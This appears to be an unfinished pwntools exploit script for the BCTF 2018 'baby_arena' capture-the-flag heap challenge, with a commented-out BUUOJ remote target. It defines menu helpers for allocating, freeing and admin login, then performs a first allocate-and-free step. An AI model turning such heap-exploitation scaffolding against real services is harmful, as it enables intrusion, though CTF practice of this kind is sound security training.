from pwn import *
#r = remote('node3.buuoj.cn',29854)
r = process('./bctf2018_baby_arena.test')
elf = ELF('./bctf2018_baby_arena.test')
libc = ELF('/libc-2.27.so')

def add(size,note):
    r.sendline('1')
    r.recvuntil('Pls Input your note size')
    r.sendline(str(size))
    r.recvuntil('Input your note')
    r.sendline(note)

def free(num):
    r.sendline('2')
    r.recvuntil('Input id:')
    r.sendline(str(num))

def login(name):
    r.sendline('3')
    r.recvuntil('Please input your name')
    r.sendline(name)
    r.recvuntil('1.admin')
    r.sendline('1')

add(0xa0,'fuck')
add(0xa0,'fuck')
free(0)
r.interactive()